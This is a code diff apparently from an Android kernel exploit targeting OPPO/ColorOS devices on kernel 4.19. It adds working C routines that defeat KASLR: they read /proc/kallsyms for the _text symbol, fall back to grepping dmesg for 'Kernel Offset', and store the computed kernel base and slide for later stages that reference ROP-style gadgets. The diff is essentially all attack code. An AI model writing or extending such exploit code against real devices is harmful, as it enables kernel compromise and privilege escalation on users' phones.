@@ -402,10 +402,74 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
+/* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
+ * are not restricted - common on OPPO/ColorOS debug builds) */
+static int slide_leak_from_kallsyms(void) {
+  FILE *f = fopen("/proc/kallsyms", "r");
+  if (!f) {
+    return 0;
+  }
+  char line[256];
+  uint64_t text = 0;
+  while (fgets(line, sizeof(line), f)) {
+    unsigned long long addr = 0;
+    char type = 0;
+    char name[128] = {0};
+    if (sscanf(line, "%llx %c %127s", &addr, &type, name) == 3 &&
+        strcmp(name, "_text") == 0) {
+      text = (uint64_t)addr;
+      break;
+    }
+  }
+  fclose(f);
+  if (text >= 0xffffff8000000000ULL && (text & 0xffff) == 0) {
+    kaslr_base = text;
+    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+    kaslr_done = 1;
+    pr_success("slide-kallsyms-ok pid=%d base=%016llx slide=%016llx\n",
+               getpid(), (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+    return 1;
+  }
+  pr_warning("slide: /proc/kallsyms restricted or _text unusable\n");
+  return 0;
+}
+
+/* round-3: dmesg "Kernel Offset" fallback */
+static int slide_leak_from_dmesg(void) {
+  FILE *f = popen("dmesg 2>/dev/null | grep 'Kernel Offset'", "r");
+  if (!f) {
+    return 0;
+  }
+  char line[256];
+  int got = 0;
+  unsigned long long off = 0;
+  while (fgets(line, sizeof(line), f)) {
+    if (sscanf(line, "%*[^:]Kernel Offset: 0x%llx", &off) == 1) {
+      got = 1;
+      break;
+    }
+  }
+  pclose(f);
+  if (!got) {
+    pr_warning("slide: dmesg Kernel Offset unavailable\n");
+    return 0;
+  }
+  kaslr_base = KIMAGE_TEXT_BASE + off;
+  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  pr_success("slide-dmesg-ok pid=%d off=%016llx base=%016llx\n",
+             getpid(), off, (unsigned long long)kaslr_base);
+  return 1;
+}
+
 int slide_leak_kernel_base(void) {
+  if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
+    return 1;
+  }
 #ifdef CFGOPS_4_19_STYLE
-  pr_warning("slide: 4.19 gadget values UNVERIFIED "
-             "(SLIDE_LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
+  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
+             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
              (unsigned long long)SLIDE_LOGGERS_0_1,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
 #endif
